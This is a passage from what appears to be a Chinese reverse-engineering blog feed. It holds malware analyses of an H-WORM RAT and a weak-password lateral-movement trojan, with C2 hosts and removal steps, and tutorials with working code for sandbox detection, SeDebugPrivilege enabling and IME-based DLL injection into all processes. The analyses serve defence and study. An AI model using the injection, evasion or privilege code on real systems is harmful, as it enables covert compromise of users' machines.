MessageBox(0,L&quot;pBaseFile2-&gt;GetClassID&quot;,0,0);        exit(1);    }    if (pBaseFile2 ==NULL)    {        MessageBox(0,L&quot;pBaseFile2 ==NULL&quot;,0,0);        exit(1);    }    IEnumPins *pEnum = NULL;    if (pBaseFile2-&gt;EnumPins(&amp;pEnum)!=0)    {        MessageBox(0,L&quot;pBaseFile2-&gt;EnumPins&quot;,0,0);        exit(-1);    }    //AddRef返回的引用计数必须大于0    if (pBaseFile2-&gt;AddRef() == 0)    {        MessageBox(0,L&quot;pBaseFile2-&gt;AddRef()&quot;,0,0);        exit(-1);    }}int _tmain(int argc, _TCHAR* argv[]){    useCom();    MessageBox(0,L&quot;没有沙箱!!!\n&quot;,0,0);    return 0;}</code></pre><p>IDA反编译结果</p><p><img src="https://img-blog.csdnimg.cn/20190905142026524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>检测沙箱</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>H-WORM变种远控分析</title>
    <link href="/cray/2019/09/04/H-WORM%E5%8F%98%E7%A7%8D%E8%BF%9C%E6%8E%A7%E5%88%86%E6%9E%90/"/>
    <url>/cray/2019/09/04/H-WORM%E5%8F%98%E7%A7%8D%E8%BF%9C%E6%8E%A7%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>FileName</th><th>FileType</th><th>MD5</th><th>Size</th></tr></thead><tbody><tr><td>4gdrwceq60b7dbl.sct</td><td>rat</td><td>69B7D326575C5616D82645960B3D081A</td><td>403845 bytes</td></tr></tbody></table><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>该样本语言类型为 VBS和JS编写，在一定程序上能躲避安全软件的查杀，通过不同混淆更容易达到免杀的效果。</p><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://img-blog.csdnimg.cn/20190916190802115.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p>这个样本母体总共会释放3个脚本</p><h3 id="脚本1"><a href="#脚本1" class="headerlink" title="脚本1"></a>脚本1</h3><p>首先我们看看<code>4gdrwceq60b7dbl.sct</code>，这个样本的母体，是一个sct格式的文件这是Visual FoxPro的表单配置文件<br>我们用<code>Sublimi Text</code>来打开它，记事本也是可以的。</p><p><img src="https://img-blog.csdnimg.cn/20190916155338357.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>利用组数来存关键字符串，通过字符串的拼接来合成完整路径<br>会尝试删除<code>%APPDATA%\\taskmgr.js</code>  这个文件<br><img src="https://img-blog.csdnimg.cn/20190916155609819.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190916160236624.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>文件中有很长一段密文，这里我改名为了<code>EncodeList</code>，通过<code>System.IO.MemoryStream.WriteByte()</code>方法把数据读入数据流中。<br>最重要的是使用<code>ADODB.Stream</code>类方法把这个数据流保存到了被上面删除掉的<code>%APPDATA%\\taskmgr.js</code>文件中<br><img src="https://img-blog.csdnimg.cn/20190916155832544.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>最后使用<code>WScript.Shell.Run</code>方法运行<code>taskmgr.js</code>文件</p><p>我这里使Python给他拿出来，命名为<code>taskmgr.js</code><br><img src="https://img-blog.csdnimg.cn/20190916161513776.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><h3 id="脚本2"><a href="#脚本2" class="headerlink" title="脚本2"></a>脚本2</h3><p>下面是<code>taskmgr.js</code> ，这个脚本其实还是一个解密脚本，也是 使用<code>AdoDB.Stream</code>处理数据流，然后使用<code>monKeyKing</code>中动态生成的eval方法去执行数据，来达到免杀<br><img src="https://img-blog.csdnimg.cn/20190916162014581.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>通过一个<code>Microsoft.XmlDom</code>的创建一个<code>tmp</code>对象，然后把这个对象赋予<code>eval</code>方法<br>最后就可以用<code>this.p</code>去访问到<code>Microsoft.XmlDom.tmp</code>，来达到命令执行<br><img src="https://img-blog.csdnimg.cn/20190916162041325.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>当然执行的命令也肯定是被加过密的，下面就是解密数据部分，这里就简单的把base64后的结果，然后把字符”A”替换成”!-%”<br><img src="https://img-blog.csdnimg.cn/20190916163628179.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><p>最后使用上面构造的<code>eval</code>去执行这段解密的代码<br><img src="https://img-blog.csdnimg.cn/2019091616391031.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><h3 id="脚本3-核心代码"><a href="#脚本3-核心代码" class="headerlink" title="脚本3 核心代码"></a>脚本3 核心代码</h3><p>这里开始分析脚本2中解密出来的代码</p><p>根据这host，port和代码量，可以判断出这个应该就是这个样本的实现核心的地方了。<br>这里其实这是一个远控加感染U盘传播</p><h4 id="U盘传播"><a href="#U盘传播" class="headerlink" title="U盘传播"></a>U盘传播</h4><p><img src="https://img-blog.csdnimg.cn/20190916165932567.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>加入开机启动注册表项，来达到持久化攻击，这基本已是木马的共性<br><img src="https://img-blog.csdnimg.cn/20190916170039587.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><p>在下面的try块中，有一个install函数会被循环调用，这个函数是用来检测感染移动存储设备的<br><img src="https://img-blog.csdnimg.cn/20190916170300961.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>install() 会去判断当前系统磁盘是否有U盘或其他移动存储介质，有的话就执行感染操作<br><img src="https://img-blog.csdnimg.cn/20190916170657111.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>枚举移动盘文件<br><img src="https://img-blog.csdnimg.cn/20190916171010711.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>如果文件不是快捷方式，那就将权限改为<strong>隐藏</strong>和<strong>系统权限</strong>，然后给他们创建一个同名<code>.lnk</code>的快捷方式<br><img src="https://img-blog.csdnimg.cn/20190916171254264.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>快捷方式被修改为了特殊构造的恶意代码，构造过程如下<br><img src="https://img-blog.csdnimg.cn/20190916171656803.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>这样每个文件都会被隐藏，然后生成一个被感染的快捷方式去诱惑其他人点击，只要一点击，就会被感染。</p><h4 id="远控模块"><a href="#远控模块" class="headerlink" title="远控模块"></a>远控模块</h4><p>这个远控一共有<code>26</code>个命令模块，分别是<br>|命令  |含义  |<br>|–|–|<br>|disconnect|   断开连接 |<br>|reboot|   重启脚本 |<br>|shutdown| 关闭脚本 |<br>|excecute| 执行命令  |<br>|install-sdk|  安装SDK |<br>|get-pass|搜集密码  |<br>|get-pass-offline|  获取浏览器密码|<br>|update|    更新|<br>|uninstall| 卸载|<br>|up-n-exec| 请求下载执行文件|<br>|bring-log| 上传日志|<br>|down-n-exec|  下载执行文件 |<br>|filemanager|   文件管理|<br>|rdp|  启动RDP |<br>|keylogger| 启动kleylogger|<br>|offline-keylogger| 启动离线版kerlogger|<br>|browse-logs|   上传日志|<br>|cmd-shell| 执行cmd命令|<br>|get-processes| 枚举进程|<br>|disable-uac|   关闭UAC|<br>|check-eligible|    检测权限|<br>|force-eligible| 暴力提权   |<br>|elevate|  普通提权 |<br>|if-elevate|   检测权限 |<br>|kill-process| 结束进程 |<br>|sleep| 挂起进程|</p><p>这个程序会释放一个脚本到%appdata%下去，命名为<code>aFCnKVCdfY.js</code><br><img src="https://img-blog.csdnimg.cn/20190916164502275.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><h3 id="脚本4"><a href="#脚本4" class="headerlink" title="脚本4"></a>脚本4</h3><p>aFCnKVCdfY.js这个和脚本三是一样的，除了域名变了，其他都没变化。</p><p><img src="https://img-blog.csdnimg.cn/20190916174051698.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><h2 id="样本溯源"><a href="#样本溯源" class="headerlink" title="样本溯源"></a>样本溯源</h2><p><strong>C&amp;C</strong><br>unknownsoft.duckdns.org:7744<br>globalization.duckdns.org:50071</p><h2 id="查杀方案"><a href="#查杀方案" class="headerlink" title="查杀方案"></a>查杀方案</h2><p>删除自启动表项<br>HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\scriptName<br>HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\scriptName</p><p>删除<br>%appdata%\aFCnKVCdfY.js<br>%temp%\aFCnKVCdfY.js<br>%APPDATA%\taskmgr.js </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>谨防不明来路的邮件，网页 文件要谨慎，要对未知文件表示怀疑，切勿怀着试一试的态度打开</p>]]></content>
    
    
    <categories>
      
      <category>样本详细分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Rat H-worm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>替换特权指令 提升权限</title>
    <link href="/cray/2019/09/03/%E6%9B%BF%E6%8D%A2%E7%89%B9%E6%9D%83%E6%8C%87%E4%BB%A4%20%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/"/>
    <url>/cray/2019/09/03/%E6%9B%BF%E6%8D%A2%E7%89%B9%E6%9D%83%E6%8C%87%E4%BB%A4%20%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/</url>
    
    <content type="html"><![CDATA[<p><strong><a href="https://zh.wikipedia.org/wiki/%E7%89%B9%E6%9D%83_(Windows)" target="_blank" rel="noopener">什么是特权</a></strong></p><p><strong>注意，这里说的提权不是从<code>Administrator</code>提升到 <code>System</code>,只是开启一些<code>Administrator</code>组的特殊权限</strong></p><p><strong>查看用户组信息使用命令 <code>whoami /all</code></strong></p><h3 id="Administrator组"><a href="#Administrator组" class="headerlink" title="Administrator组"></a>Administrator组</h3><p>管理员组一般权限比较多，但是很多都禁用了,我们这里需要的是<code>SeDebugPrivilege</code>，要是进程拥有了这个权限，就能对任意进程进行操作（包括<code>system</code>）</p><p><img src="https://img-blog.csdnimg.cn/20190905184130154.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20190905190534272.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><blockquote><p>当用户试图执行一个特权操作，系统检查用户的访问令牌以确定使用是否具有必要的特权。调用GetTokenInformation函数可以检查特权。</p></blockquote><p>我要做的就是找到找到一个系统中有<code>SeDebugPrivilege</code>权限的令牌，然后复制下来，把自己的令牌改为他这个，然乎自己就拥有了<code>SeDebugPrivilege</code>权限了。这也就是提升权限的核心。</p><p>下图是我使用 <code>OpenProcess</code>对SID为4的系统进程进行操作，且操作权限是<code>PROCESS_ALL_ACCESS</code></p><p><img src="https://img-blog.csdnimg.cn/20190905190019240.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><p>下面看看具体实现</p><pre><code class="c">void CgPivilige(){    BOOL retn;    HANDLE hToken;    retn = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY | READ_CONTROL, &amp;hToken);//修改令牌特权值    if (retn != TRUE)    {        printf(&quot;获取令牌句柄失败!&quot; );        return;    }    TOKEN_PRIVILEGES tp; //新特权结构体    LUID Luid;    retn = LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;Luid);//查看具有调试权限的令牌    if (retn != TRUE)    {        printf(&quot;获取Luid失败&quot; );        return;    }    //给TP和TP里的LUID结构体赋值    tp.PrivilegeCount = 1;    tp.Privileges[0].Luid = Luid;    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;    AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);//调整自己Token为有调试特权的Token    if (GetLastError() != ERROR_SUCCESS)    {        printf(&quot;修改特权不完全或失败!&quot; );    }    else    {        printf(&quot;修改成功!&quot; );    }}</code></pre><p>下面给一个病毒使用的提升权限 IDA伪代码</p><pre><code>int __cdecl reloadToken_4108F0(LPCWSTR lpName){  HANDLE v2; // eax  struct _LUID Luid; // [esp+0h] [ebp-24h]  HANDLE TokenHandle; // [esp+8h] [ebp-1Ch]  struct _TOKEN_PRIVILEGES NewState; // [esp+Ch] [ebp-18h]  if ( !LookupPrivilegeValueW(0, lpName, &amp;Luid) )// lpnmae SedebugPrivilege  查看拥有调试权限的令牌    return 0;  v2 = GetCurrentProcess();  if ( !OpenProcessToken(v2, 0x20028u, &amp;TokenHandle) )// 0x20028 = TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY|READ_CONTROL    return 0;  NewState.Privileges[0].Luid = Luid;  NewState.PrivilegeCount = 1;  NewState.Privileges[0].Attributes = 2;  AdjustTokenPrivileges(TokenHandle, 0, &amp;NewState, 0, 0, 0);// 将访问令牌中禁用的权限启用，来达到权限提升  CloseHandle(TokenHandle);  return 1;}</code></pre><h3 id="普通用户组"><a href="#普通用户组" class="headerlink" title="普通用户组"></a>普通用户组</h3><p>普通用户组本身权限就比较少<br><img src="https://img-blog.csdnimg.cn/20190905175911142.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20190905183658642.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>Crat是普通用户组成员<br><img src="https://img-blog.csdnimg.cn/20190905191224944.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>普通用户一般是没有<code>SeDebugPrivilege</code> 权限的，也就是说这个用户组根本就没这个权限，不是能不能打开的问题，而是根本没有。</p><p>所以普通用户不存在什么使用令牌的权限提升，即使有，都只是很小的一些权限。</p><h4 id="查看进程权限"><a href="#查看进程权限" class="headerlink" title="查看进程权限"></a>查看进程权限</h4><p>程序能运行在<code>low</code> <code>medium</code> <code>hight</code> 三个level下,那怎么在通过代码检测自己拥有什么权限呢？</p><p>通过<code>GetTokenInformation</code>拿到这个进程的<code>TokenInformation</code>信息 再通过比较<code>Label.Sid,</code>的值</p><pre><code class="c">void ShowProcessIntegrityLevel(){    HANDLE hToken;    HANDLE hProcess;    DWORD dwLengthNeeded;    DWORD dwError = ERROR_SUCCESS;    PTOKEN_MANDATORY_LABEL pTIL = NULL;    DWORD dwIntegrityLevel;    hProcess = GetCurrentProcess();    if (OpenProcessToken(hProcess, TOKEN_QUERY |        TOKEN_QUERY_SOURCE, &amp;hToken))    {        // Get the Integrity level.        if (!GetTokenInformation(hToken, TokenIntegrityLevel,            NULL, 0, &amp;dwLengthNeeded))        {            dwError = GetLastError();            if (dwError == ERROR_INSUFFICIENT_BUFFER)            {                pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0,                    dwLengthNeeded);                if (pTIL != NULL)                {                    if (GetTokenInformation(hToken, TokenIntegrityLevel,                        pTIL, dwLengthNeeded, &amp;dwLengthNeeded))                    {                        dwIntegrityLevel = *GetSidSubAuthority(pTIL-&gt;Label.Sid,                            (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL-&gt;Label.Sid) - 1));                        if (dwIntegrityLevel &lt; SECURITY_MANDATORY_MEDIUM_RID)                        {                            // Low Integrity                            wprintf(L&quot;Low Integrity Process&quot;);                        }                        else if (dwIntegrityLevel &gt;= SECURITY_MANDATORY_MEDIUM_RID &amp;&amp;                            dwIntegrityLevel &lt; SECURITY_MANDATORY_HIGH_RID)                        {                            // Medium Integrity                            wprintf(L&quot;Medium Integrity Process&quot;);                        }                        else if (dwIntegrityLevel &gt;= SECURITY_MANDATORY_HIGH_RID)                        {                            // High Integrity                            wprintf(L&quot;High Integrity Process&quot;);                        }                    }                    LocalFree(pTIL);                }            }        }        CloseHandle(hToken);    }}</code></pre><p>参考  <a href="https://www.cnblogs.chom/hqu-ye/articles/4838381.html" target="_blank" rel="noopener">https://www.cnblogs.chom/hqu-ye/articles/4838381.html</a></p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>弱口令横向传播</title>
    <link href="/cray/2019/09/02/%E5%88%A9%E7%94%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E4%BC%A0%E6%92%AD%E6%A8%AA%E5%90%91%E7%9A%84%E8%BF%9C%E6%8E%A7%E7%BB%84%E4%BB%B6/"/>
    <url>/cray/2019/09/02/%E5%88%A9%E7%94%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E4%BC%A0%E6%92%AD%E6%A8%AA%E5%90%91%E7%9A%84%E8%BF%9C%E6%8E%A7%E7%BB%84%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>@[toc]</p><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>FileName</th><th>FileType</th><th>MD5</th><th>Size</th></tr></thead><tbody><tr><td>sample.exe</td><td>rat</td><td>4D049BC19B03572EF8A00980050BAFFF</td><td>28160 bytes</td></tr></tbody></table><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>此木马拥有横向传播能力扫描局域网主机，利用弱口令尝试登陆，上传运行自身，这样来传播。该木马会获取并上传被害者系统配置，方便进一步攻击，木马中有接收命令，执行命令的模块，也是这个木马的核心，达到执行作者发过来的命令<br>该木马主要使用壳伪装自己，让安全软件不能找到敏感关键字符串，从而躲避安全软件的查杀。</p><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://img-blog.csdnimg.cn/20190912201229272.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p>程序加了两个壳，一个压缩壳UPX，一个Armadillo 都能用PEID插件脱掉</p><p><img src="https://img-blog.csdnimg.cn/20190912110554278.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019091211080334.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>点击脱壳之后修复下导入表就好了，修复之后查壳效果<br><img src="https://img-blog.csdnimg.cn/20190912111234244.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>导入函数<br><img src="https://img-blog.csdnimg.cn/20190912112624974.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>还有很多字符串就不列了，格式都是这种。<br>从字符串中能看出，该样本有命令执行，联网，创建服务，处理资源数据，操作注册表的功能<br>基本也就能猜测是释放资源段文件到新文件，然后加入服务启动，来达到启动的目的，下面看啊可能具体操作。</p><h4 id="动态加IDA"><a href="#动态加IDA" class="headerlink" title="动态加IDA"></a>动态加IDA</h4><p>该样本定义大量局部变量，使用硬编码方式存储数据<br><img src="https://img-blog.csdnimg.cn/20190912113106227.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>移动到ascii上，右键char就可以看到字符了<br><img src="https://img-blog.csdnimg.cn/20190912113423102.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>这里创了一个名为121212的互斥体，防止程序多开。</p><p>尝试打开注册表项<code>HKEY_LOCAL_MACHINE\system\currentcontrolset\services\.Net CLR</code><br><img src="https://img-blog.csdnimg.cn/20190912114556853.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>第一次找不到值 直接退出<br>接着就开始创建新线程</p><p>程序中还有一个枚举资源的回调函数，但是并没有执行起来</p><h3 id="线程1"><a href="#线程1" class="headerlink" title="线程1"></a>线程1</h3><p><img src="https://img-blog.csdnimg.cn/20190912114858505.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><p>创建第一个线程<br><img src="https://img-blog.csdnimg.cn/20190912114930476.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>硬编码很多常用账户和弱口令密码<br>下面看看怎么玩的</p><p>首先通过<code>gethostname</code>获取主机信息,然后通过<code>gethostbyname</code>获取主机IP地址，这里默认是掩码为<code>24</code>的网段。</p><p>使用弱口令爆破这个网段的每一台主机</p><p><img src="https://img-blog.csdnimg.cn/2019091213240296.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>分别遍历上面的UserName和PassWord表，调用<code>402A40()</code>函数进行爆破<br>看看具体过程<br><img src="https://img-blog.csdnimg.cn/20190912130116130.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>先尝试连接一波服务器</p><p><img src="https://img-blog.csdnimg.cn/20190912130156139.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>连接好后开始往自生和目标主机的共享目录的的C、D、 E盘写入自身，也就是目前运行这个程序</p><p>最后再使用<code>at</code> 让程序2分钟后执行</p><p>就是这样，程序就开始了横向传播</p><h3 id="线程2"><a href="#线程2" class="headerlink" title="线程2"></a>线程2</h3><p><img src="https://img-blog.csdnimg.cn/20190912140134565.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>创建第二个线程<br>会获取当前日期与<code>20130221</code>比较<br>然后又会创建一个线程<br><img src="https://img-blog.csdnimg.cn/20190912140748479.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>继续看这个Rat线程，这个线程才是这个木马的核心，命令执行<br><img src="https://img-blog.csdnimg.cn/20190912141038643.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019091214092223.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>会尝试连接<code>arwah.uy1433.com:8090</code>服务器<br><img src="https://img-blog.csdnimg.cn/20190912141724864.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>向C2发送配置信息，大致内容如下。<br><img src="https://img-blog.csdnimg.cn/20190912142056932.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>这里还会调用<code>4036c8()</code>来接收命令，用于后面的使用，因为F5效果不理想，看看汇编。<br><img src="https://img-blog.csdnimg.cn/20190912142409368.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>会使用<code>select</code>接收发来的数据</p><p><img src="https://img-blog.csdnimg.cn/2019091214260294.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><h4 id="远控功能1：下载文件执行"><a href="#远控功能1：下载文件执行" class="headerlink" title="远控功能1：下载文件执行"></a>远控功能1：下载文件执行</h4><p>当参数是0x10时，在本地根据开机时间创建一个临时目录，下载远程服务器的文件到这个文件中，然后执行这个程序<br><img src="https://img-blog.csdnimg.cn/20190912143533196.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><h4 id="远控功能2：清除运行记录"><a href="#远控功能2：清除运行记录" class="headerlink" title="远控功能2：清除运行记录"></a>远控功能2：清除运行记录</h4><p>这里会删除之前创建的服务，删除注册表键值对，并且下载一个程序，<br><img src="https://img-blog.csdnimg.cn/20190912144509224.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>删除相应值<br><img src="https://img-blog.csdnimg.cn/20190912145143590.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><h4 id="远控功能3：使用ie访问指定地址"><a href="#远控功能3：使用ie访问指定地址" class="headerlink" title="远控功能3：使用ie访问指定地址"></a>远控功能3：使用ie访问指定地址</h4><p>这个可以进行DDos攻击，或者展示广告页面给被害者。<br><img src="https://img-blog.csdnimg.cn/20190912145226470.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p><h4 id="远控功能4：攻击模块"><a href="#远控功能4：攻击模块" class="headerlink" title="远控功能4：攻击模块"></a>远控功能4：攻击模块</h4><p>下面还有一个用来网络攻击的专用模块<br><img src="https://img-blog.csdnimg.cn/20190916152048725.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019091615140094.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190916151556490.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>其实上面所使用的User-Agent都已经能朔源到这是一个在2008年就存在的DDos攻击的模块</p><h3 id="线程3"><a href="#线程3" class="headerlink" title="线程3"></a>线程3</h3><p>创建一个访问本地的线程，这个线程与线程2有相似的地方，代码重用很多<br><img src="https://img-blog.csdnimg.cn/20190912151723315.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190912153059337.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>这里做个猜想，这个木马是有目的的，已经在内网环境中有一台ip为<code>192.168.1.107</code>的主机已经被感染，这里说他说是服务器,然后这些被感染的主机都往这个服务器发送消息，接收执行命令。而这个线程就是来收集信息的。</p><h2 id="样本溯源"><a href="#样本溯源" class="headerlink" title="样本溯源"></a>样本溯源</h2><p>arwah.uy1433.com:8090<br>192.168.1.107</p><h2 id="查杀方案"><a href="#查杀方案" class="headerlink" title="查杀方案"></a>查杀方案</h2><p>结束该进程<br>删除木马文件</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个马是有目的性的，攻击目标应该不是面向普通用户，需要和服务器配合，而且木马没有持久化攻击模块，也就是说重启后就没有了，影响不是很大。</p>]]></content>
    
    
    <categories>
      
      <category>样本详细分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>malware Rat</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>输入法注入</title>
    <link href="/cray/2019/08/26/%E8%BE%93%E5%85%A5%E6%B3%95%E6%B3%A8%E5%85%A5/"/>
    <url>/cray/2019/08/26/%E8%BE%93%E5%85%A5%E6%B3%95%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><p>因为输入法的本身特性，能注入任何一个程序，还可以开机启动，很是友好</p><p>网上大都是一个版本方法，我记录下我自己过程</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>1.编写一个正常的输入法<br>2.将它安装到电脑上，并设置为默认输入法，这样就可以在程序打开的时候就调用它的处理函数</p><p>因为输入是一个特殊的dll，本质就是一个dll，只是后最不同而已。</p><p>一个最简ime文件都必须两个函数</p><p>一个<code>dllmain()</code> 还有一个<code>ImeInquire()</code>这两个是必须的</p><h3 id="编写输入法主要文件"><a href="#编写输入法主要文件" class="headerlink" title="编写输入法主要文件"></a>编写输入法主要文件</h3><p>创建一个dll项目,解释都在注释中（注意项目为多字节字符集）<br><code>dllmain.cpp</code></p><pre><code class="C">#include &quot;stdafx.h&quot;#include &quot;windows.h&quot;#include &quot;imm.h&quot;#include &quot;immdev.h&quot;#pragma comment(lib,&quot;imm32.lib&quot;)LPCSTR injectDllPaht = &quot;C://expDll.dll&quot;; //我们最终利用的Dll，写入自己的功能void injectDLL();//定义函数，下面用LRESULT WINAPI UIWndProc(HWND hUIWnd,                         UINT message,                        WPARAM wParam,                         LPARAM lParam) { return 0; }//窗口消息处理函数，可以不要BOOL APIENTRY DllMain(HMODULE hModule,    DWORD  ul_reason_for_call,    LPVOID lpReserved    )//主函数的标准格式{    HINSTANCE hinstDLL = (HINSTANCE)hModule;//下面需要用这个句柄，格式强转以下    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:    {        //定义一个窗口类           WNDCLASSEX wc;           wc.cbSize = sizeof(WNDCLASSEX);           wc.style = CS_VREDRAW | CS_HREDRAW | CS_DBLCLKS | CS_IME;           wc.lpfnWndProc = UIWndProc;           wc.cbClsExtra = 0;           wc.cbWndExtra = 2 * sizeof(LONG);           wc.hInstance = hinstDLL;           wc.hCursor = LoadCursor(NULL, IDC_ARROW); //IDC_ARROW           wc.hIcon = NULL;           wc.lpszMenuName = (LPTSTR)NULL;           wc.lpszClassName = TEXT(&quot;CInjWindow&quot;);//定义的窗口类的名字           wc.hbrBackground = NULL;           wc.hIconSm = NULL;           if (!RegisterClassEx((LPWNDCLASSEX)&amp;wc))//注册这个窗口，IME必须要注册一个窗口才能安装           {               break;           }           injectDLL();//干事的func           break;    }    case DLL_THREAD_ATTACH:        break;    case DLL_THREAD_DETACH:        break;    case DLL_PROCESS_DETACH:        UnregisterClass(&quot;CInjWindow&quot;, hinstDLL);//程序退出时注销窗口实例        break;    }    return TRUE;}void injectDLL(){    WCHAR Mes[MAX_PATH];    //这里就可以写注入func，我这里就调用一个自己写的测试dll，每次加载的时候都会打印父窗口名称    HMODULE hMyDll = LoadLibrary(injectDllPaht);//因为现在已经在别的进程中，所以导入后的就成功注入想要的进程了    if (!hMyDll)    {        DWORD ERRCODE = GetLastError();        MessageBox(0, (LPCSTR)ERRCODE, 0, 0);    }    else    {        HMODULE hParentM = GetModuleHandle(0);        //FARPROC fRunFunc = GetProcAddress(hMyDll, &quot;Run&quot;);        //fRunFunc();    }}BOOL WINAPI ImeInquire(LPIMEINFO lpImeInfo, LPTSTR lpszUIClass, LPCTSTR lpszOption){    //初始化ImeInquire    //这个函数是除了DllMain后第一个会被win32 调用的函数. 通过调用这个函数知道你的输入法有什么特性.    lpImeInfo-&gt;dwPrivateDataSize = 0;    